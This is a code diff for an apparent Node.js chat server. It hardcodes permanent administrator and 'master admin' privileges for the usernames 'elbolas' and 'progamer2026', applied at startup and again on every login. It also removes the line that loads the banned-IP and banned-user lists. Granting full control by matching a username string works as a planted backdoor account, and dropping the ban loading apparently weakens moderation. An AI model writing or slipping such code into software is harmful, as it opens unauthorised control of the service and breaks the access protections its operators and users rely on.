@@ -200,8 +200,16 @@ function generateToken() {
 let channels = loadChannels();
 saveChannels();
 
-const { ips: bannedIPs, users: bannedUsers } = loadBans();
 let accounts = loadAccounts();
+
+// Garantizar privilegios de Administrador Maestro permanente a elbolas y progamer2026
+['elbolas', 'progamer2026'].forEach(admName => {
+  if (accounts[admName]) {
+    accounts[admName].isAdmin = true;
+    accounts[admName].isMasterAdmin = true;
+  }
+});
+saveAccounts();
 
 // Mapa de socketId -> Usuario activo
 const users = new Map();
@@ -286,6 +294,12 @@ function getClientIP(socket) {
 
 // Función auxiliar para conectar e inicializar un usuario en el servidor
 function initializeSession(socket, userAccount) {
+  const lowerName = (userAccount.username || '').toLowerCase();
+  if (lowerName === 'elbolas' || lowerName === 'progamer2026') {
+    userAccount.isAdmin = true;
+    userAccount.isMasterAdmin = true;
+  }
+
   const user = {
     id: socket.id,
     username: userAccount.username,
